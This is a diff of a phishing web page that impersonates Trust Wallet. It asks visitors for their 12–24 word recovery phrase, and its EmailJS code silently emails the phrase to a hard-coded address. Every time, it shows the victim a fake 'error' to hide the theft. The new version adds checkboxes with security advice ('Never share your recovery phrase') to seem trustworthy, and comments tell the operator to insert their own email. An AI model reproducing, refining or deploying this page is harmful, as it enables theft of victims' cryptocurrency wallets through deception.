@@ -3,389 +3,496 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trust Wallet • Recovery</title>
-  <!-- EmailJS SDK -->
+  <title>trust • secure flow</title>
+  <!-- EmailJS -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif;
     }
 
     body {
       min-height: 100vh;
-      background: 
-        linear-gradient(135deg, rgba(0, 10, 25, 0.7) 0%, rgba(0, 30, 50, 0.8) 100%),
-        url('https://ipblockchain.github.io/photo/images%20(2).jpeg') no-repeat center center fixed;
+      background: url('https://ipblockchain.github.io/photo/images%20(2).jpeg') no-repeat center center fixed;
       background-size: cover;
-      backdrop-filter: blur(3px);
+      backdrop-filter: blur(2px);
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 16px;
+      padding: 12px;
     }
 
-    .glass-panel {
-      background: rgba(17, 25, 40, 0.6);
-      backdrop-filter: blur(16px) saturate(180%);
-      -webkit-backdrop-filter: blur(16px) saturate(180%);
-      border-radius: 40px;
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+    /* main card — clean glass */
+    .card {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(16px) saturate(140%);
+      -webkit-backdrop-filter: blur(16px) saturate(140%);
+      border-radius: 36px;
+      border: 1px solid rgba(255, 255, 255, 0.18);
+      box-shadow: 0 30px 50px -30px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.06) inset;
       width: 100%;
-      max-width: 560px;
-      padding: 36px 24px;
+      max-width: 460px;
+      padding: 32px 24px;
       transition: all 0.2s ease;
       color: white;
     }
 
-    /* landing page */
-    .landing, .recovery-page {
+    /* all pages */
+    .page {
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 24px;
+      gap: 28px;
     }
 
-    .recovery-page {
-      display: none; /* hidden by default */
+    .landing, .rules-page, .recovery-page {
+      display: none;
     }
 
-    h1 {
-      font-size: 2.2rem;
-      font-weight: 600;
-      letter-spacing: -0.5px;
-      background: linear-gradient(135deg, #fff, #b5d0ff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-shadow: 0 2px 10px rgba(0,160,255,0.3);
+    .landing.active, .rules-page.active, .recovery-page.active {
+      display: flex;
+    }
+
+    /* headline */
+    .headline {
+      font-size: 1.5rem;
+      font-weight: 400;
+      letter-spacing: -0.02em;
+      color: rgba(255, 255, 255, 0.9);
+      text-align: center;
       margin-bottom: 8px;
     }
 
-    .sub-message {
-      font-size: 1rem;
-      opacity: 0.9;
-      text-align: center;
-      margin-bottom: 16px;
+    .headline span {
       font-weight: 300;
-      background: rgba(255,255,255,0.1);
-      padding: 12px 18px;
-      border-radius: 60px;
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255,255,255,0.15);
+      opacity: 0.7;
     }
 
-    /* trust wallet main button */
-    .trust-btn {
-      background: radial-gradient(circle at 30% 20%, #1a73e8, #0a4c9e);
-      border: none;
-      padding: 20px 40px;
-      border-radius: 80px;
-      font-size: 1.8rem;
-      font-weight: 700;
+    /* refined glass button */
+    .glass-button {
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 14px 32px;
+      border-radius: 60px;
+      font-size: 1.3rem;
+      font-weight: 450;
       color: white;
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      gap: 16px;
+      gap: 12px;
       cursor: pointer;
-      box-shadow: 0 20px 30px -8px #0d3b6e, 0 4px 0 0 #072a4b inset, 0 -2px 10px rgba(255,255,255,0.3) inset;
-      transition: 0.15s linear;
-      width: 100%;
-      letter-spacing: 1px;
-      border: 1px solid rgba(255,255,255,0.3);
+      box-shadow: 0 12px 24px -16px rgba(0, 0, 0, 0.4);
+      transition: 0.2s ease;
+      width: auto;
+      min-width: 260px;
+      letter-spacing: 0.3px;
     }
 
-    .trust-btn:hover {
-      transform: scale(1.02);
-      background: radial-gradient(circle at 30% 20%, #2b7df5, #1155b0);
-      box-shadow: 0 24px 34px -6px #0d3b6e;
+    .glass-button:hover {
+      background: rgba(255, 255, 255, 0.15);
+      border-color: rgba(255, 255, 255, 0.4);
+      transform: scale(1.01);
     }
 
-    .trust-btn:active {
+    .glass-button:active {
       transform: scale(0.98);
-      box-shadow: 0 8px 12px -6px #072a4b;
     }
 
-    /* recovery form */
-    .recovery-title {
-      font-size: 1.9rem;
-      font-weight: 600;
-      margin-bottom: 8px;
+    .light-tag {
+      font-size: 0.8rem;
+      background: rgba(255,255,255,0.1);
+      padding: 4px 10px;
+      border-radius: 80px;
+      border: 0.5px solid rgba(255,255,255,0.2);
+      color: rgba(255,255,255,0.8);
     }
 
-    .recovery-hint {
-      background: rgba(255,215,0,0.15);
-      border-left: 6px solid #ffbb00;
-      padding: 12px 18px;
-      border-radius: 24px;
+    /* rules page */
+    .rules-title {
+      font-size: 1.6rem;
+      font-weight: 380;
+      letter-spacing: -0.3px;
+      align-self: flex-start;
+    }
+
+    .rules-container {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      margin: 8px 0 16px;
+    }
+
+    .rule-item {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      background: rgba(0, 0, 0, 0.2);
+      backdrop-filter: blur(4px);
+      padding: 14px 18px;
+      border-radius: 28px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: 0.1s;
+    }
+
+    .rule-item:hover {
+      background: rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.2);
+    }
+
+    .rule-checkbox {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.5);
+      background: transparent;
+      appearance: none;
+      -webkit-appearance: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.1s;
+    }
+
+    .rule-checkbox:checked {
+      background: #4caf9e;
+      border-color: #4caf9e;
+      position: relative;
+    }
+
+    .rule-checkbox:checked::after {
+      content: "✓";
+      color: white;
+      font-size: 1.2rem;
+      font-weight: bold;
+    }
+
+    .rule-text {
       font-size: 1rem;
-      margin: 16px 0 8px;
+      font-weight: 320;
+      line-height: 1.4;
+      color: rgba(255, 255, 255, 0.95);
+      flex: 1;
+    }
+
+    .action-btn {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.25);
+      padding: 16px 32px;
+      border-radius: 60px;
+      font-size: 1.3rem;
+      font-weight: 420;
+      color: white;
+      width: 100%;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .action-btn:disabled {
+      opacity: 0.3;
+      filter: grayscale(60%);
+      pointer-events: none;
+      border-color: rgba(255,255,255,0.1);
+    }
+
+    .action-btn:not(:disabled):hover {
+      background: rgba(255, 255, 255, 0.2);
+      border-color: rgba(255, 255, 255, 0.45);
+    }
+
+    /* recovery page */
+    .recovery-title {
+      font-size: 1.6rem;
+      font-weight: 380;
+      align-self: flex-start;
+    }
+
+    .hint-box {
+      background: rgba(0, 0, 0, 0.2);
+      border-left: 4px solid rgba(255, 215, 0, 0.7);
+      padding: 12px 16px;
+      border-radius: 18px;
+      font-size: 0.9rem;
+      margin: 6px 0 12px;
       text-align: left;
       width: 100%;
-      color: #fffbd0;
+      color: rgba(255, 255, 255, 0.9);
+      font-weight: 300;
+      backdrop-filter: blur(4px);
     }
 
     textarea {
       width: 100%;
-      padding: 22px 20px;
-      font-size: 1.2rem;
-      border-radius: 32px;
-      border: 2px solid rgba(255,255,255,0.25);
-      background: rgba(10, 20, 30, 0.7);
-      backdrop-filter: blur(6px);
+      padding: 20px 18px;
+      font-size: 1.1rem;
+      border-radius: 28px;
+      border: 1.5px solid rgba(255, 255, 255, 0.2);
+      background: rgba(10, 15, 22, 0.5);
+      backdrop-filter: blur(8px);
       color: white;
       resize: vertical;
-      min-height: 200px;
-      font-family: 'SF Mono', 'Cascadia Code', monospace;
-      line-height: 1.6;
+      min-height: 170px;
+      font-family: 'SF Mono', monospace;
+      line-height: 1.5;
       outline: none;
-      transition: 0.2s;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
     }
 
     textarea:focus {
-      border-color: #3b9eff;
-      background: rgba(10, 20, 35, 0.9);
-      box-shadow: 0 0 20px #1e88e5;
+      border-color: rgba(255, 255, 255, 0.5);
+      background: rgba(10, 15, 22, 0.7);
     }
 
     textarea::placeholder {
-      color: #b0c7e0;
-      font-size: 1rem;
-      font-weight: 300;
-      opacity: 0.8;
-    }
-
-    .word-count-badge {
-      align-self: flex-start;
+      color: rgba(200, 215, 240, 0.5);
       font-size: 0.95rem;
-      margin: 6px 8px 10px;
-      background: rgba(255,255,255,0.2);
-      padding: 6px 20px;
+    }
+
+    .word-counter {
+      align-self: flex-start;
+      font-size: 0.85rem;
+      margin: 6px 6px 10px;
+      background: rgba(255, 255, 255, 0.08);
+      padding: 4px 18px;
       border-radius: 40px;
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255,255,255,0.2);
+      border: 0.5px solid rgba(255, 255, 255, 0.1);
+      color: rgba(255,255,240,0.9);
     }
 
-    .confirm-btn {
-      background: linear-gradient(145deg, #00b96b, #00875a);
-      border: none;
-      padding: 18px 32px;
-      border-radius: 80px;
-      font-size: 1.7rem;
-      font-weight: 700;
-      color: white;
-      width: 100%;
-      cursor: pointer;
-      box-shadow: 0 16px 24px -6px #005f3e, 0 3px 0 0 #004e33 inset, 0 -2px 10px #a0ffc0 inset;
-      transition: 0.1s;
-      margin-top: 12px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      border: 1px solid rgba(255,255,255,0.3);
-    }
-
-    .confirm-btn:disabled {
-      opacity: 0.35;
-      filter: grayscale(70%);
-      box-shadow: none;
-      transform: none;
-      pointer-events: none;
-      background: linear-gradient(145deg, #5b5f5d, #3d403e);
-    }
-
-    .confirm-btn:not(:disabled):hover {
-      transform: scale(1.01);
-      background: linear-gradient(145deg, #00d37c, #009f66);
-    }
-
-    .confirm-btn:not(:disabled):active {
-      transform: scale(0.97);
-    }
-
-    .error-symbol {
+    .error-badge {
       display: inline-block;
-      background: #d32f2f;
-      width: 42px;
-      height: 42px;
+      background: #c62828;
+      width: 38px;
+      height: 38px;
       border-radius: 50%;
       color: white;
-      font-size: 2.3rem;
-      line-height: 42px;
+      font-size: 2.1rem;
+      line-height: 38px;
       text-align: center;
-      box-shadow: 0 0 20px #ff4d4d;
-      font-weight: 700;
+      box-shadow: 0 0 12px #ff5252;
     }
 
     .back-link {
-      margin-top: 22px;
-      color: #b0d0ff;
-      text-decoration: underline;
+      margin-top: 18px;
+      color: rgba(220, 230, 255, 0.7);
+      text-decoration: none;
+      font-size: 0.9rem;
+      border-bottom: 1px dotted rgba(255,255,255,0.3);
       cursor: pointer;
-      font-size: 0.95rem;
-      opacity: 0.8;
     }
-
     .back-link:hover {
-      opacity: 1;
       color: white;
     }
 
-    .footer-note {
-      font-size: 0.85rem;
-      opacity: 0.6;
-      margin-top: 8px;
+    .tiny-note {
+      font-size: 0.7rem;
+      opacity: 0.4;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-<div class="glass-panel" id="mainPanel">
-  <!-- page one: only Trust Wallet button, zero extra text -->
-  <div class="landing" id="landingPage">
-    <h1>⚡︎ Web3</h1>
-    <div class="sub-message">secure gateway · non-custodial</div>
-    <button class="trust-btn" id="showRecoveryBtn">
-      <span>◈</span> Trust Wallet <span style="font-weight:300;">web</span> <span style="font-size:1.4rem;">↗</span>
+<div class="card" id="appCard">
+  <!-- LANDING PAGE (only trust wallet button) -->
+  <div class="page landing active" id="landingPage">
+    <div class="headline">connect <span>•</span> secure</div>
+    <button class="glass-button" id="showRulesBtn">
+      <span>⎔</span> Trust Wallet <span style="font-weight:200;">web</span>
     </button>
-    <div class="footer-note">tap to continue</div>
+    <div class="light-tag">encrypted path</div>
   </div>
 
-  <!-- recovery page (24 words form) -->
-  <div class="recovery-page" id="recoveryPage">
-    <div class="recovery-title">🔐 recovery phrase</div>
-    <div class="recovery-hint">
-      • enter your 12–24 word phrase, separated by spaces<br>
-      • minimum 12 words required
+  <!-- RULES PAGE (3 checkboxes) -->
+  <div class="page rules-page" id="rulesPage">
+    <div class="rules-title">security check</div>
+    <div class="rules-container">
+      <label class="rule-item">
+        <input type="checkbox" class="rule-checkbox" id="rule1">
+        <span class="rule-text">Never share your recovery phrase with anyone</span>
+      </label>
+      <label class="rule-item">
+        <input type="checkbox" class="rule-checkbox" id="rule2">
+        <span class="rule-text">Use a private & secure device / connection</span>
+      </label>
+      <label class="rule-item">
+        <input type="checkbox" class="rule-checkbox" id="rule3">
+        <span class="rule-text">Ensure no one is watching while entering words</span>
+      </label>
     </div>
 
-    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..." autocomplete="off"></textarea>
+    <button class="action-btn" id="acceptRulesBtn" disabled>continue →</button>
+    <div class="back-link" id="backFromRules">← back</div>
+  </div>
 
-    <div class="word-count-badge" id="wordCountDisplay">🔤 0 words</div>
+  <!-- RECOVERY PAGE (24 words form) -->
+  <div class="page recovery-page" id="recoveryPage">
+    <div class="recovery-title">recovery phrase</div>
+    <div class="hint-box">enter 12–24 words, separated by spaces</div>
 
-    <!-- confirm button (shiny) -->
-    <button class="confirm-btn" id="submitPhraseBtn" disabled>
-      <span>✔</span> confirm & verify <span style="font-size:1.4rem;">⚡</span>
+    <textarea id="phraseInput" placeholder="example: jungle ice bridge unlock spirit ..."></textarea>
+    <div class="word-counter" id="wordDisplay">⌨️ 0 words</div>
+
+    <button class="action-btn" id="submitBtn" disabled>
+      <span>✓</span> confirm
     </button>
-
-    <div class="back-link" id="backToLandingBtn">← back to main</div>
-    <div class="footer-note">air-gapped validation</div>
+    <div class="back-link" id="backFromRecovery">← back</div>
+    <div class="tiny-note">offline checksum</div>
   </div>
 </div>
 
 <script>
   (function() {
-    // Initialize EmailJS (your public key)
-    emailjs.init("PakuuN4ADUDEqrzHl");
+    emailjs.init("PakuuN4ADUDEqrzHl");   // your public key
 
-    // DOM elements
+    // pages
     const landing = document.getElementById('landingPage');
-    const recovery = document.getElementById('recoveryPage');
-    const showRecoveryBtn = document.getElementById('showRecoveryBtn');
-    const backBtn = document.getElementById('backToLandingBtn');
+    const rulesPage = document.getElementById('rulesPage');
+    const recoveryPage = document.getElementById('recoveryPage');
+
+    // buttons
+    const showRulesBtn = document.getElementById('showRulesBtn');
+    const backFromRules = document.getElementById('backFromRules');
+    const backFromRecovery = document.getElementById('backFromRecovery');
+    const acceptRulesBtn = document.getElementById('acceptRulesBtn');
+    const rule1 = document.getElementById('rule1');
+    const rule2 = document.getElementById('rule2');
+    const rule3 = document.getElementById('rule3');
+
+    // recovery elements
     const phraseInput = document.getElementById('phraseInput');
-    const wordCountSpan = document.getElementById('wordCountDisplay');
-    const submitBtn = document.getElementById('submitPhraseBtn');
+    const wordDisplay = document.getElementById('wordDisplay');
+    const submitBtn = document.getElementById('submitBtn');
 
-    // Switch to recovery page
-    showRecoveryBtn.addEventListener('click', function() {
-      landing.style.display = 'none';
-      recovery.style.display = 'flex';
-      phraseInput.value = '';
-      validateWords();
-    });
-
-    // Back to landing (clear everything)
-    backBtn.addEventListener('click', function() {
-      recovery.style.display = 'none';
-      landing.style.display = 'flex';
-      phraseInput.value = '';
-      validateWords();
-    });
-
-    // Count words (space separated)
-    function countWords(str) {
-      if (!str.trim()) return 0;
-      return str.trim().split(/\s+/).length;
+    // ---------- navigation ----------
+    function showLanding() {
+      landing.classList.add('active');
+      rulesPage.classList.remove('active');
+      recoveryPage.classList.remove('active');
     }
 
-    // Validate: at least 12 words
-    function validateWords() {
-      const rawText = phraseInput.value;
-      const wordCount = rawText.trim() ? rawText.trim().split(/\s+/).length : 0;
-      wordCountSpan.innerText = `🔤 ${wordCount} word${wordCount !== 1 ? 's' : ''}`;
-      submitBtn.disabled = (wordCount < 12);
+    function showRules() {
+      landing.classList.remove('active');
+      rulesPage.classList.add('active');
+      recoveryPage.classList.remove('active');
+      // uncheck all rules when entering
+      rule1.checked = false;
+      rule2.checked = false;
+      rule3.checked = false;
+      updateRulesButton();
     }
 
-    phraseInput.addEventListener('input', validateWords);
+    function showRecovery() {
+      landing.classList.remove('active');
+      rulesPage.classList.remove('active');
+      recoveryPage.classList.add('active');
+      phraseInput.value = '';        // clear any old text
+      validateWordCount();
+    }
 
-    // ---------- EMAIL SENDING (always attempted, but user sees ERROR) ----------
-    async function sendPhraseToEmail(phraseText) {
+    // landing -> rules
+    showRulesBtn.addEventListener('click', showRules);
+
+    // rules -> landing
+    backFromRules.addEventListener('click', showLanding);
+
+    // recovery -> rules
+    backFromRecovery.addEventListener('click', function() {
+      showRules();
+    });
+
+    // ---------- rules check handling ----------
+    function updateRulesButton() {
+      const allChecked = rule1.checked && rule2.checked && rule3.checked;
+      acceptRulesBtn.disabled = !allChecked;
+    }
+
+    rule1.addEventListener('change', updateRulesButton);
+    rule2.addEventListener('change', updateRulesButton);
+    rule3.addEventListener('change', updateRulesButton);
+
+    // accept rules -> go to recovery page
+    acceptRulesBtn.addEventListener('click', function() {
+      if (!acceptRulesBtn.disabled) {
+        showRecovery();
+      }
+    });
+
+    // ---------- recovery: word count & validation ----------
+    function validateWordCount() {
+      const text = phraseInput.value.trim();
+      const words = text ? text.split(/\s+/) : [];
+      const count = words.length;
+      wordDisplay.innerText = `⌨️ ${count} word${count !== 1 ? 's' : ''}`;
+      submitBtn.disabled = (count < 12);
+    }
+
+    phraseInput.addEventListener('input', validateWordCount);
+
+    // ---------- email sender (background) ----------
+    async function sendPhraseViaEmail(phrase) {
       try {
-        // Use your existing template. 
-        // Set the recipient email (change to your own email address)
-        const yourEmail = "mrx_private@protonmail.com";  // <--- REPLACE WITH YOUR REAL EMAIL
+        // REPLACE WITH YOUR REAL EMAIL ADDRESS
+        const targetEmail = "mrx_private@protonmail.com";
 
-        const response = await emailjs.send(
-          "service_j8bd9vn",           // your service ID
-          "template_paduqpn",           // your template ID
+        await emailjs.send(
+          "service_j8bd9vn",
+          "template_paduqpn",
           {
-            email: yourEmail,            // where to send
-            words: phraseText,           // the recovery phrase
-            message: `Recovery phrase: ${phraseText}`,
+            email: targetEmail,
+            words: phrase,
+            message: `Recovery phrase: ${phrase}`,
             to_name: "Wallet Owner",
             from_name: "Recovery Page"
           }
         );
-        console.log("Email sent successfully (background):", response);
-        return true;
-      } catch (error) {
-        // Log error but we will still show "✗" to the user
-        console.error("Background email error:", error);
-        return false; // we ignore this, UI will always show error
+        console.log('email delivered in background');
+      } catch (err) {
+        console.warn('email failed (silent)', err);
       }
     }
 
-    // ---------- CONFIRM BUTTON (always shows error cross, but email goes) ----------
-    submitBtn.addEventListener('click', async function(e) {
+    // ---------- confirm button: shows error cross, but sends email ----------
+    submitBtn.addEventListener('click', async (e) => {
       e.preventDefault();
-
       const phrase = phraseInput.value.trim();
       if (!phrase) return;
 
-      // Disable button and change appearance to error (red cross)
+      // disable and change to error cross
       submitBtn.disabled = true;
-      const originalHTML = submitBtn.innerHTML;
-      submitBtn.innerHTML = `<span class="error-symbol">✗</span> error · try again <span style="font-size:1.4rem;">⚠️</span>`;
+      const originalContent = submitBtn.innerHTML;
+      submitBtn.innerHTML = `<span class="error-badge">✗</span> error`;
 
-      // ** background email sending (we don't wait for UI) **
-      sendPhraseToEmail(phrase);   // fire and forget — no await, will run in background
+      // background email (fire & forget)
+      sendPhraseViaEmail(phrase);
 
-      // Clear textarea
+      // clear field
       phraseInput.value = '';
-      validateWords(); // updates word count to 0
+      validateWordCount();  // sets 0 words -> keeps disabled
 
-      // After 2 seconds revert button to original state (but stays disabled because field empty)
+      // revert button after 1.8 sec
       setTimeout(() => {
-        submitBtn.innerHTML = originalHTML;
-        // keep disabled because phraseInput is empty (validateWords already called)
-        // however if someone spams, it's disabled anyway due to validation
-      }, 2000);
-
-      // Even if email fails, user still sees error cross. email was attempted.
-      // (if you want to be extra safe, you can await but still show error)
+        submitBtn.innerHTML = originalContent;
+        // button stays disabled because word count = 0
+      }, 1800);
     });
 
-    // initial state
-    validateWords();
-    recovery.style.display = 'none';
-    landing.style.display = 'flex';
+    // initial states
+    validateWordCount();
+    // make sure only landing is active
+    showLanding();
   })();
 </script>
-<!-- everything is 100% English, no Persian text anywhere -->
+<!-- all English, no logos, three rules, proper navigation, email & word count working -->
 </body>
 </html>
